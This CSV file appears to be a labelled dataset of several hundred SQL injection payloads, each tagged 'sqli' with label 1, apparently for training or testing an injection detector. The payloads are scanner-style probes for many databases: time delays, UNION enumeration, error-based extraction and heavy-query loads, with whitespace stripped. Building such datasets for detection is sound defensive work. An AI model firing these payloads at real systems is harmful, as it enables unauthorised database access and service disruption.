payload,attack_type,label
"1')procedureanalyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select(casewhen(5840=5840)then1else0end)),0x717a767a71)),1)and('eiau'='eiau",sqli,1
"1"")or(select*from(select(sleep(5)))ydpu)and(""cadh""like""cadh",sqli,1
"1'orrow(1045,7562)>(selectcount(*),concat(0x7171706a71,(select(elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))xfrom(select8488unionselect5584unionselect3051unionselect1210)agroupbyx)and'kdxg'like'kdxg",sqli,1
"-4347'unionallselect6074,6074,6074,6074,6074,6074,6074--",sqli,1
"1')))(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0)))and((('weof'='weof",sqli,1
"1)or(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(8113=8113,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))",sqli,1
1'||(select'ubza'where2576=2576;select(casewhen(4341=7041)then4341else4341*(select4341frommysql.db)end)#,sqli,1
"1)));selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4and(((1105=1105",sqli,1
1')rlikesleep(5)#,sqli,1
-8812or6872=6872#dflr,sqli,1
"1%"")));selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5and(((""%""=""",sqli,1
"-4592""))or4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4493=4493)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and((""xvpz""=""xvpz",sqli,1
"1%"";select(casewhen(1776=7688)then1776else1/(select0)end)--",sqli,1
"1'+(selectjleywhere3581=3581and2388=benchmark(5000000,md5(0x6d457153))#",sqli,1
"1%""));selectsleep(5)and((""%""=""",sqli,1
1');begindbms_lock.sleep(5);end,sqli,1
1)));(select*from(select(sleep(5)))srmq)and(((3124=3124,sqli,1
1';select(casewhen(1412=5313)then1412else1412*(select1412frommysql.db)end)#,sqli,1
"1""where2547=2547orsleep(5)#",sqli,1
"-8098%')unionallselect5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",sqli,1
"1"")or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and(""nnmz""like""nnmz",sqli,1
-6145or(8459=8459)*4906--yklv,sqli,1
"1'+(select'ayod'where7839=7839or(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(8113=8113,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610))))+'",sqli,1
"1%"")))procedureanalyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
"1')))or6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"-7887')unionallselect9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",sqli,1
1')))rlike(select*from(select(sleep(5)))sgvo)and((('npzh'='npzh,sqli,1
"1"")where7228=7228;selectlike('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1'+(select'asdq'where4023=4023andmake_set(8403=8403,8899))+'",sqli,1
1';selectcasewhen7717=7717then1elsenullend--,sqli,1
-4484'))or6872=6872and(('oxuo'='oxuo,sqli,1
1'andsleep(5)and'kapr'='kapr,sqli,1
"1'||(select'bnaz'fromdualwhere7168=7168and2716=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
"-6854""where7794=7794unionallselect7794,7794--",sqli,1
1)where7956=7956orsleep(5)#,sqli,1
"1'+(select'epza'where8994=8994andmake_set(3782=2428,2428))+'",sqli,1
"-9740""))aspxkxwhere5305=5305or1groupbyconcat(0x7171706a71,(select(casewhen(4232=4232)then1else0end)),0x717a767a71,floor(rand(0)*2))havingmin(0)#",sqli,1
"1'))and3202=like('abcdefg',upper(hex(randomblob(500000000/2))))and(('qgdv'='qgdv",sqli,1
"1"")unionallselectnull,null,null,null,null#",sqli,1
1');select(casewhen(4297=9086)then4297else1/(select0)end)--,sqli,1
"1where4331=4331unionallselectnull,null,null,null,null,null#",sqli,1
"1')unionallselectnull,null,null,null,null,null,null,null,null,null#",sqli,1
"1where6077=6077orchar(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1
"1"")));selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3--",sqli,1
"1"")asrntewhere6517=6517and9254=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
1');selectsleep(5)and('vwmx'='vwmx,sqli,1
"1unionallselectnull,null,null,null,null,null#",sqli,1
"1%"")));beginuser_lock.sleep(5);end--",sqli,1
"1"")and3202=like('abcdefg',upper(hex(randomblob(500000000/2))))and(""hsaw""=""hsaw",sqli,1
"1'where4185=4185procedureanalyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1
"-5245"")))unionallselect8106,8106,8106#",sqli,1
"1""));select(casewhen(6961=7460)then1else6961*(select6961frommaster..sysdatabases)end)--",sqli,1
"1%"";callregexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1
"1'||(select'iuud'where3687=3687;select*fromgenerate_series(4592,4592,casewhen(4592=4592)then1else0end)limit1--",sqli,1
1'))asvnwnwhere8774=8774and(select*from(select(sleep(5)))gcrr)#,sqli,1
"-3719""unionallselect6609,6609,6609,6609#",sqli,1
"1"")asdienwhere4022=4022;createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)--",sqli,1
1)where2468=2468and(select*from(select(sleep(5)))gcrr)#,sqli,1
"1',(select(casewhen(5433=5433)then1elsecast(1asint)/(select0fromdual)end)fromdual)",sqli,1
"1""))asqvyuwhere5962=5962orupdatexml(1808,concat(0x2e,0x7171706a71,(select(elt(1808=1808,1))),0x717a767a71),8666)--",sqli,1
"1""))asrheawhere2982=2982or(select*from(select(sleep(5)))ydpu)--",sqli,1
"1)andchar(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1
1%';select(casewhen(4769=4769)then4769else4769*(select4769frommysql.db)end)#,sqli,1
"1))(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0)))and((1402=1402",sqli,1
"1%"");beginuser_lock.sleep(5);end--",sqli,1
"1""))aslomwwhere9257=9257unionallselectnull,null,null,null,null,null--",sqli,1
1'+(select'lpkv'where8760=8760;if(7899=7899)select7899elsedropfunctionzbbp--,sqli,1
"-9289))ormake_set(5101=9919,9919)and((8977=8977",sqli,1
"-5247""unionallselect3097,3097,3097,3097,3097,3097,3097#",sqli,1
1')where9817=9817;beginuser_lock.sleep(5);end--,sqli,1
"1""andmake_set(8403=8403,8899)",sqli,1
"1'inbooleanmode);selectdbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5)fromdual#",sqli,1
-9178')or9779=6351,sqli,1
"1%"")))or2367=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
1')aszxoswhere2745=2745;selectpg_sleep(5)--,sqli,1
"1""))or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and((""sjiz""like""sjiz",sqli,1
"1""))aszvalwhere2255=2255or(select*from(select(sleep(5)))sddo)#",sqli,1
"1,(select*fromgenerate_series(9108,9108,casewhen(9108=2900)then1else0end)limit1)",sqli,1
1)))and4595=4595#,sqli,1
"1"")where9827=9827;callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
1)asusnnwhere3201=3201;selectpg_sleep(5)--,sqli,1
"1%'and2716=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
1'||(select'exls'where3837=3837andsleep(5))||',sqli,1
"1)asboedwhere6787=6787;selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5--",sqli,1
"1%"")))unionallselectnull,null--",sqli,1
"1%"")));select*fromgenerate_series(4592,4592,casewhen(4592=4592)then1else0end)limit1--",sqli,1
1where7882=7882;selectsleep(5)#,sqli,1
"1');selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4--",sqli,1
1'+(selectahywwhere6893=6893waitfordelay'0:0:5'--,sqli,1
"1""));select(casewhen(6276=6276)then6276else6276*(select6276frominformation_schema.character_sets)end)#",sqli,1
"1'+(select'zugq'where9218=9218;select*fromgenerate_series(7536,7536,casewhen(7536=7523)then1else0end)limit1--",sqli,1
"1%"")unionallselectnull,null,null,null,null,null--",sqli,1
1'))or4240=(select4240frompg_sleep(5))--,sqli,1
"1'))andupdatexml(3393,concat(0x2e,0x7171706a71,(select(elt(3393=3393,1))),0x717a767a71),1161)and(('vedm'='vedm",sqli,1
"1'+(selectpapcwhere8900=8900andelt(3114=3114,sleep(5))#",sqli,1
"1""and7533=7533and""btak""like""btak",sqli,1
"1""or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and""zcfa""=""zcfa",sqli,1
"1')and6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(6055=6055)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1
"1"")));beginuser_lock.sleep(5);endand(((""revx""=""revx",sqli,1
"1%"");selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3--",sqli,1
"1%';select*fromgenerate_series(4592,4592,casewhen(4592=4592)then1else0end)limit1--",sqli,1
"-4543"")or3038=3038",sqli,1
"1""where6800=6800procedureanalyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
"1'+(select'arzm'where6464=6464or8466=benchmark(5000000,md5(0x694a4745)))+'",sqli,1
"-9046'))asymqcwhere3733=3733unionallselect3733,3733,3733,3733,3733,3733,3733--",sqli,1
"1%"")orchar(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1
"1')asjysmwhere8961=8961unionallselectnull,null#",sqli,1
"1"")where6843=6843or6793=(select6793frompg_sleep(5))--",sqli,1
"-7661""unionallselect9551,9551,9551#",sqli,1
"1))aswajywhere8593=8593;callregexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1
"1%'))andchar(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and(('%'='",sqli,1
"-5859)asernqwhere8394=8394unionallselect8394,8394,8394--",sqli,1
"1"")where9648=9648andelt(1210=1210,sleep(5))--",sqli,1
1)))and6969=(select6969frompg_sleep(5))and(((5333=5333,sqli,1
-6122')))or9243=6161--,sqli,1
"1)asilqxwhere8547=8547;selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
1')where2852=2852;selectcasewhen7717=7717then1elsenullend--,sqli,1
"-7868""unionallselect1805--",sqli,1
"1')where8835=8835or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1and2388=benchmark(5000000,md5(0x6d457153))#",sqli,1
"1))asrpwtwhere4103=4103and3580=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1""where5098=5098and2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(2853=2853)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)--",sqli,1
-7710'where5658=5658or3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(3440=3440)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)--,sqli,1
"1where6221=6221and9254=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
1')waitfordelay'0:0:5',sqli,1
"1%""))unionallselectnull,null--",sqli,1
1%'));begindbms_lock.sleep(5);end--,sqli,1
"-4076'))unionallselect9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",sqli,1
"1""or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and""uosc""=""uosc",sqli,1
"1'inbooleanmode)unionallselectnull,null,null,null--",sqli,1
"-9596)where3425=3425unionallselect3425,3425,3425,3425,3425,3425#",sqli,1
"-1184"")))unionallselect1482--",sqli,1
"1))asbsvowhere3605=3605;selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4--",sqli,1
"1))or7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1
"1""(select(casewhen(5451=5451)thenregexp_substring(repeat(right(char(5451),0),500000000),null)elsechar(108)||char(76)||char(112)||char(116)end)frominformation_schema.system_users)and""kszu""=""kszu",sqli,1
"1where1299=1299;selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
"1%""))rlikesleep(5)#",sqli,1
-8264%')orderby1#,sqli,1
1)));selectsleep(5)and(((8354=8354,sqli,1
"1""where6281=6281or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1;selectbenchmark(5000000,md5(0x4c4d6142))#idxq",sqli,1
"1"")aseefewhere5290=5290and(select*from(select(sleep(5)))gcrr)#",sqli,1
1)asvbliwhere5139=5139and2782=2625--,sqli,1
5739-5738,sqli,1
"1%""));select(casewhen(9393=5530)then9393elsecast(1asint)/(select0fromdual)end)fromdual--",sqli,1
"1""andsleep(5)",sqli,1
"1"")))or(select*from(select(sleep(5)))ydpu)and(((""djwo""=""djwo",sqli,1
"-2925%""ormake_set(9354=9354,7185)and""%""=""",sqli,1
"1'))(select(casewhen(5451=5451)thenregexp_substring(repeat(right(char(5451),0),500000000),null)elsechar(108)||char(76)||char(112)||char(116)end)frominformation_schema.system_users)and(('rnyb'='rnyb",sqli,1
"1unionallselectnull,null#",sqli,1
1'+(select'dkxk'where1241=1241waitfordelay'0:0:5'--,sqli,1
"-7016%""))unionallselect8847,8847,8847--",sqli,1
-1621'inbooleanmode)orderby1--,sqli,1
"-2759%""))or7769=1249#",sqli,1
"1')and8407=(selectcount(*)fromgenerate_series(1,5000000))and('lwrk'like'lwrk",sqli,1
"1%'))orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and(('%'='",sqli,1
1%');select(casewhen(4666=4666)then1else4666*(select4666frommaster..sysdatabases)end)--,sqli,1
"-9937'))unionallselect3900,3900,3900,3900,3900,3900,3900,3900,3900#",sqli,1
"-1876'||(select'itfc'fromdualwhere9584=9584unionallselect9584,9584,9584,9584,9584,9584,9584,9584--",sqli,1
"1%"")or6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1')))or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and((('phdn'like'phdn",sqli,1
"1'))andelt(6847=5874,5874)and(('yspu'='yspu",sqli,1
"1'))or8421=(selectcount(*)fromgenerate_series(1,5000000))and(('qgov'='qgov",sqli,1
"1%""))andsleep(5)and((""%""=""",sqli,1
"1%""unionallselectnull,null,null,null,null,null,null,null--",sqli,1
"1)orextractvalue(1297,concat(0x5c,0x7171706a71,(select(elt(1297=1297,1))),0x717a767a71))",sqli,1
1'||(select'ifts'fromdualwhere6329=6329;begindbms_lock.sleep(5);end--,sqli,1
"1'))or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and(('fvov'='fvov",sqli,1
"1"")where7950=7950and3580=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"-7323%""or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)and""%""=""",sqli,1
"1'where8083=8083andupdatexml(3393,concat(0x2e,0x7171706a71,(select(elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1
"1')where3331=3331or5356=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
1'waitfordelay'0:0:5'and'vwuz'='vwuz,sqli,1
"1')andchar(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)and('sqni'like'sqni",sqli,1
"1)where1443=1443unionallselectnull,null,null,null,null#",sqli,1
1)rlike(select*from(select(sleep(5)))vwyq)#,sqli,1
"1')))orrow(1045,7562)>(selectcount(*),concat(0x7171706a71,(select(elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))xfrom(select8488unionselect5584unionselect3051unionselect1210)agroupbyx)and((('drvk'like'drvk",sqli,1
"1');callregexp_substring(repeat(right(char(3702),0),500000000),null)and('xcnj'='xcnj",sqli,1
"1'||(select'glec'fromdualwhere4846=4846;callregexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1
"1')))andelt(1210=1210,sleep(5))and((('acdu'='acdu",sqli,1
"1"")))andupdatexml(3393,concat(0x2e,0x7171706a71,(select(elt(3393=3393,1))),0x717a767a71),1161)and(((""opdl""=""opdl",sqli,1
"1"")))orupdatexml(1808,concat(0x2e,0x7171706a71,(select(elt(1808=1808,1))),0x717a767a71),8666)and(((""mmsh""=""mmsh",sqli,1
"1%'));selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3and(('%'='",sqli,1
"1';selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3--",sqli,1
"-8065"")))orderby1--",sqli,1
1where7464=7464rlike(select(casewhen(7689=7689)then1else0x28end))--,sqli,1
"-5362)unionallselect7297,7297,7297,7297,7297#",sqli,1
"1'))asfusiwhere2788=2788or8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1
1');selectcasewhen7717=7717then1elsenullend--,sqli,1
"-3361where1335=1335orelt(5891=5092,5092)--",sqli,1
"-9977""where5132=5132unionallselect5132--",sqli,1
1))rlike(select(casewhen(7689=7689)then1else0x28end))and((4279=4279,sqli,1
"1""))asxwrqwhere4161=4161;selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
1')where8429=8429;select(casewhen(3855=3855)then3855else1/(select0)end)--,sqli,1
"1))or4915=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
1'))asyefvwhere4263=4263;waitfordelay'0:0:5'--,sqli,1
"1'));select*fromgenerate_series(7407,7407,casewhen(7407=6562)then1else0end)limit1--",sqli,1
"-9871unionallselect6094,6094,6094,6094,6094,6094,6094#",sqli,1
"1')asmpsfwhere3348=3348;selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5--",sqli,1
"-3632'ormake_set(9354=9354,7185)and'lgpy'like'lgpy",sqli,1
"-8950""))asuahswhere2113=2113unionallselect2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",sqli,1
"1))asxroywhere3274=3274;iif(3760=4785,1,1/0)",sqli,1
1'+(selectlqhdwhere4251=4251and(8754=5779)*5779)+',sqli,1
"1""where6111=6111and9660=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"-9638)))orelt(1032=1032,3623)and(((3679=3679",sqli,1
1')asftypwhere5851=5851or4240=(select4240frompg_sleep(5))--,sqli,1
"1"")))and(7758=4628)*4628and(((""wzas""=""wzas",sqli,1
"1%""and3580=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
1')))and(3020=3020)*6703and((('nhrc'like'nhrc,sqli,1
"1')))orelt(6272=6272,sleep(5))and((('ayjb'like'ayjb",sqli,1
"1"")andextractvalue(7982,concat(0x5c,0x7171706a71,(select(elt(7982=7982,1))),0x717a767a71))and(""rfpq""=""rfpq",sqli,1
"1'||(select'kyhs'fromdualwhere9491=9491;selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3--",sqli,1
"1')or8421=(selectcount(*)fromgenerate_series(1,5000000))and('csmu'='csmu",sqli,1
"1%""))andelt(3114=3114,sleep(5))#",sqli,1
"-2570""or1570=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(1570=1570)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and""dmch""like""dmch",sqli,1
"1%"")))or4240=(select4240frompg_sleep(5))--",sqli,1
1where3027=3027and4595=4595#,sqli,1
"1where6965=6965andelt(3933=1232,1232)--",sqli,1
"1"";createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)and""cyrb""=""cyrb",sqli,1
1where7021=7021or6793=(select6793frompg_sleep(5))--,sqli,1
"1""where4672=4672;selectdbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5)fromdual--",sqli,1
-4713')))or4567=1287,sqli,1
1;waitfordelay'0:0:5'#ogzq,sqli,1
"1'));selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3and(('xiyl'like'xiyl",sqli,1
"1%"")and6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)and(""%""=""",sqli,1
"-4915'unionallselect1928,1928,1928,1928#",sqli,1
"1'||(select'xtcb'where5240=5240;callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",sqli,1
"1"";(select*from(select(sleep(5)))acdk)#",sqli,1
"1%')unionallselectnull,null,null,null,null,null,null,null,null,null#",sqli,1
"1""))asnnczwhere2331=2331;selectcasewhen6420=7941then1elsenullend--",sqli,1
"1))or8156=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
"1%""or6793=(select6793frompg_sleep(5))and""%""=""",sqli,1
"1%"")))unionallselectnull,null,null,null,null,null,null#",sqli,1
"1%"";select(casewhen(4769=4769)then4769else4769*(select4769frommysql.db)end)#",sqli,1
"1"")aslvbmwhere8179=8179;selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3--",sqli,1
"-8409%')ormake_set(9354=9354,7185)and('%'='",sqli,1
"-8538""or2724in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(2724=2724)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1
"1')orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)and('wdru'like'wdru",sqli,1
1'inbooleanmode);select(casewhen(1275=7674)then1275else1275*(select1275frominformation_schema.character_sets)end)#,sqli,1
"1%')or8466=benchmark(5000000,md5(0x694a4745))and('%'='",sqli,1
"-3775')or1groupbyconcat(0x7171706a71,(select(casewhen(4232=4232)then1else0end)),0x717a767a71,floor(rand(0)*2))havingmin(0)#",sqli,1
"1"")and6969=(select6969frompg_sleep(5))and(""btht""=""btht",sqli,1
"-1631%"")orelt(8285=1709,1709)and(""%""=""",sqli,1
1'||(select'tfqg'fromdualwhere9862=9862and(select*from(select(sleep(5)))gcrr)#,sqli,1
"1%"")));select*fromgenerate_series(9964,9964,casewhen(9964=4455)then1else0end)limit1--",sqli,1
"1'))asusrkwhere6324=6324unionallselectnull,null,null,null,null,null,null,null,null,null--",sqli,1
"-5817'inbooleanmode)unionallselect2391,2391,2391,2391,2391--",sqli,1
"1"")where8153=8153;select(casewhen(3855=3855)then3855else1/(select0)end)--",sqli,1
"1',(select(casewhen(7711=7711)then1else7711*(select7711frominformation_schema.character_sets)end))",sqli,1
"1%"")))orextractvalue(1297,concat(0x5c,0x7171706a71,(select(elt(1297=1297,1))),0x717a767a71))and(((""%""=""",sqli,1
"-2321%"")or2271=7683--",sqli,1
"1"")asvqkzwhere8536=8536;beginuser_lock.sleep(5);end--",sqli,1
"1""))and6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)and((""nbfe""=""nbfe",sqli,1
"-2287'))unionallselect1200,1200,1200,1200,1200#",sqli,1
"1""));selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3and((""vqpx""like""vqpx",sqli,1
-7345)unionallselect3866#,sqli,1
1rlikesleep(5)--muhp,sqli,1
"1')asbdeiwhere9531=9531and3580=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1%')))andupdatexml(3393,concat(0x2e,0x7171706a71,(select(elt(3393=3393,1))),0x717a767a71),1161)and((('%'='",sqli,1
"1"")where4951=4951;selectdbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5)fromdual--",sqli,1
"1'androw(6237,7469)>(selectcount(*),concat(0x7171706a71,(select(elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))xfrom(select5192unionselect3785unionselect3931unionselect7158)agroupbyx)and'eovg'like'eovg",sqli,1
1'and3754=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(3754=3754)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)and'ixzr'='ixzr,sqli,1
1'and7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(7756=7756)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and'napi'like'napi,sqli,1
"1%')unionallselectnull,null,null,null,null--",sqli,1
"1'))procedureanalyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)and(('beoh'='beoh",sqli,1
"1%"")or4411=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and(""%""=""",sqli,1
"1""or4915=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1
"1))asrsnbwhere3168=3168procedureanalyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
1)where9078=9078rlikesleep(5)#,sqli,1
"1));callregexp_substring(repeat(right(char(3702),0),500000000),null)and((4142=4142",sqli,1
"-8279""unionallselect6598,6598,6598,6598,6598,6598,6598,6598#",sqli,1
"1""))procedureanalyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select(casewhen(5840=5840)then1else0end)),0x717a767a71)),1)and((""jzbb""=""jzbb",sqli,1
"-5661'))unionallselect3011,3011#",sqli,1
"1and3580=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1""where3329=3329orsleep(5)--",sqli,1
"1%"");selectbenchmark(5000000,md5(0x4c4d6142))and(""%""=""",sqli,1
1')and9198=9198--,sqli,1
"-9135""))or6872=6872and((""fllx""=""fllx",sqli,1
"1')andextractvalue(7982,concat(0x5c,0x7171706a71,(select(elt(7982=7982,1))),0x717a767a71))and('pmzp'like'pmzp",sqli,1
-6045or8919=2827--,sqli,1
1))assyotwhere1199=1199;waitfordelay'0:0:5'--,sqli,1
